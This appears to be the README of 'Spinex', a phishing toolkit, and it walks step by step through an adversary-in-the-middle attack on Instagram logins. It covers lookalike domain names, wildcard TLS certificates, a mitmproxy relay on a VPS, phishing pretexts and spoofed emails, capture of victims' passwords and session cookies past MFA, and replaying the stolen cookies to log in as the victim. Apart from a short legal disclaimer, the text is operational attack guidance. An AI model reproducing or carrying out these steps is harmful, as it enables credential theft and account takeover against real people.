<h1 align="center">
  <br>
  <a href="https://github.com/vibebhavv/Spinex"><img src="https://i.ibb.co/XkMMkvdc/spinex-logo.png" alt="Spinex" width="200"></a>
  <br>
  Spinex
  <br>
</h1>

# Spinex Phish

> ⚠️ **This tool is intended for authorized penetration testing and security research only.**
> Using this against systems or accounts without explicit written permission is illegal.
> The authors are not responsible for any misuse.

---

## Overview

This tutorial covers a full end-to-end Instagram AiTM (Adversary-in-the-Middle) attack using Spinex.
The proxy sits between the victim and Instagram's real login page, capturing session cookies and
credentials in real time — bypassing MFA entirely.

```
Victim browser
      │
      │  HTTPS  (your real cert for instagram.yourdomain.com)
      ▼
Your Spinex proxy server
      │
      │  HTTPS  (real Instagram cert)
      ▼
www.instagram.com
```

---

## Prerequisites

| Requirement | Notes |
|---|---|
| Linux VPS | Ubuntu 22.04+ recommended. DigitalOcean, Vultr, Hetzner (~$5/mo) |
| Domain name | Any registrar. `.xyz` costs ~$1/year on Porkbun/Namecheap |
| DNS provider with API | Cloudflare (free) is easiest for wildcard cert automation |
| Python 3.10+ | On the VPS |
| mitmproxy | `pip install mitmproxy` |
| certbot + cloudflare plugin | `pip install certbot certbot-dns-cloudflare` |

---

## Step 1 — Get a Domain and Point DNS to Cloudflare

1. Register a convincing lookalike domain on [Porkbun](https://porkbun.com) or [Namecheap](https://namecheap.com).
   Examples:
   ```
   instagram-securelogin.com
   ig-account-verify.com
   meta-login-portal.com
   ```

2. In your domain registrar, set the nameservers to Cloudflare:
   ```
   ns1.cloudflare.com
   ns2.cloudflare.com
   ```

3. In Cloudflare dashboard → your domain → DNS → Add records:
   ```
   Type    Name    Content         Proxy status
   A       @       <your VPS IP>   DNS only (grey cloud)
   A       *       <your VPS IP>   DNS only (grey cloud)
   ```
   The wildcard `*` record covers all subdomains automatically.

4. Verify DNS propagation:
   ```bash
   nslookup instagram.yourdomain.com
   # Should return your VPS IP
   ```

---

## Step 2 — Set Up Your VPS

SSH into your VPS and install dependencies:

```bash
# Update system
apt update && apt upgrade -y

# Install Python and pip
apt install python3 python3-pip git -y

# Install mitmproxy
pip3 install mitmproxy psutil

# Install certbot with Cloudflare DNS plugin
pip3 install certbot certbot-dns-cloudflare

# Clone Spinex
git clone https://github.com/vibebhavv/Spinex.git
cd Spinex

# Install Spinex requirements
pip3 install -r requirements.txt
```

---

## Step 3 — Get Cloudflare API Token

1. Go to [dash.cloudflare.com](https://dash.cloudflare.com) → My Profile → API Tokens
2. Click **Create Token**
3. Use template **Edit zone DNS**
4. Under Zone Resources → select your domain
5. Click **Continue to summary** → **Create Token**
6. Copy the token — you only see it once

---

## Step 4 — Configure Spinex

Start the Streamlit dashboard on your VPS:

```bash
streamlit run app.py --server.address 0.0.0.0 --server.port 8501
```

Open `http://<your-vps-ip>:8501` in your browser.

### 4a. AiTM Config (`⚙️ AiTM Config`)

| Field | Value |
|---|---|
| Base domain | `yourdomain.com` |
| Server IP | `<your VPS IP>` |
| ACME email | Your email (for Let's Encrypt notifications) |
| Platforms | ✅ Instagram |
| Proxy port | `443` |

Click **💾 Save configuration**.

### 4b. DNS Check

Still on AiTM Config, click **Run DNS check** — all subdomains should show ✅ OK.
If any show ❌, wait a few minutes for DNS propagation and try again.

---

## Step 5 — Fetch TLS Certificate (`🔒 TLS Certificate`)

1. Go to **🔒 TLS Certificate** page
2. Click **🆕 Fetch new cert** tab
3. Select **☁️ Cloudflare** as DNS provider
4. Paste your Cloudflare API token
5. Leave propagation seconds at 60
6. Click **🚀 Fetch certificate**

This automatically:
- Calls Let's Encrypt ACME API
- Creates a DNS TXT record via Cloudflare API to prove domain ownership
- Downloads a wildcard cert for `*.yourdomain.com`
- Builds the combined PEM for mitmproxy

You should see:
```
✅ Certificate fetched successfully!
✅ Combined PEM written to creds/combined-cert.pem
```

The cert status cards should show:
```
Cert on disk: YES    Status: VALID    Days left: 89    mitmproxy PEM: READY
```

---

## Step 6 — Launch the Proxy (`⚡ Proxy Launcher`)

1. Go to **⚡ Proxy Launcher**
2. Check all pre-flight items show ✅ green:
   ```
   ✓ Base domain: yourdomain.com
   ✓ Platforms: instagram
   ✓ Certificate: /etc/letsencrypt/live/yourdomain.com/fullchain.pem
   ✓ Combined PEM: creds/combined-cert.pem
   ✓ aitm_addon.py found
   ✓ mitmdump: mitmproxy x.x.x
   ```
3. Click **🚀 Start proxy**
4. Status pill turns green: `● PROXY RUNNING`
5. The active domain map shows:
   ```
   www.instagram.com   →   instagram.yourdomain.com
   i.instagram.com     →   instagram-2.yourdomain.com
   ```

Your proxy is now live on port 443.

---

## Step 7 — Send the Phishing Link

The phishing URL is your proxy subdomain — the victim visits this instead of Instagram:

```
https://instagram.yourdomain.com
```

This loads the **real Instagram login page** proxied through your server.
The victim sees a valid HTTPS padlock (your real Let's Encrypt cert).

**Delivery methods:**
- Email (use Spinex's 📨 Email Spoofer page to craft a convincing email)
- Direct message
- SMS
- Fake Instagram security alert email

**Convincing pretexts:**
- "Unusual login detected — verify your account"
- "Your account has been reported — log in to appeal"
- "Enable two-factor authentication to secure your account"

---

## Step 8 — Monitor Sessions (`🎯 Live Sessions`)

1. Open **🎯 Live Sessions**
2. Enable **Auto-refresh** toggle
3. When victim clicks your link and logs in, a session appears within seconds

**Session status progression:**
```
new  →  (victim visits page)
active  →  (victim submits credentials)
captured  →  (Instagram issues session cookies — MFA bypassed)
```

When status reaches **CAPTURED**, expand the session to see:

### 🔑 Credentials tab
```
Username · username   →   victim_username
Password · password   →   victim_password
```

### 🍪 Session Cookies tab
```
sessionid    →   <Instagram session token>
ds_user_id   →   <victim user ID>
csrftoken    →   <CSRF token>
```

Copy the DevTools-ready string at the bottom:
```
sessionid=ABC123; ds_user_id=123456789; csrftoken=XYZ
```

### Using the stolen session

1. Open Chrome DevTools on `https://www.instagram.com` → Application → Cookies
2. Delete existing cookies
3. Paste the stolen cookies one by one
4. Refresh the page — you are now logged in as the victim

---

## Step 9 — Cleanup

After the engagement:

1. Stop the proxy — **🛑 Stop proxy** in Proxy Launcher
2. Delete captured sessions from the dashboard — check sessions → **🗑️ Delete**
3. Revoke the Cloudflare API token (Cloudflare dashboard → API Tokens → Revoke)
4. Document findings for your penetration testing report

---

## Troubleshooting

| Issue | Fix |
|---|---|
| Victim sees certificate warning | DNS not pointing to your server, or cert fetch failed — recheck Step 5 |
| `Client TLS handshake failed` in proxy log | Combined PEM missing or wrong — redo Step 5 |
| Sessions not appearing | Check proxy log for errors — addon may not be loading |
| Instagram blocks the proxy | Instagram detects automated traffic — try adding browser headers to aitm_addon.py |
| Cert expiry warning | Go to TLS Certificate → Renew existing |

---

## File Structure Reference

```
Spinex/
├── app.py                  — Streamlit dashboard
├── aitm_addon.py           — mitmproxy addon (credential/cookie capture + rewriting)
├── config_manager.py       — configuration logic
├── cert_manager.py         — TLS certificate lifecycle
├── proxy_launcher.py       — mitmdump process management
├── proxy_page.py           — Proxy Launcher UI
├── session_viewer.py       — Live Sessions UI
├── config_page.py          — AiTM Config UI
├── cert_page.py            — TLS Certificate UI
├── spinex_config.json      — your configuration
└── creds/
    ├── aitm_sessions.json  — captured sessions
    ├── aitm_cookies.json   — raw cookie log
    ├── aitm_credentials.json — raw credential log
    ├── aitm_headers.json   — raw header log
    ├── proxy.log           — mitmdump log
    └── combined-cert.pem   — mitmproxy TLS cert
```
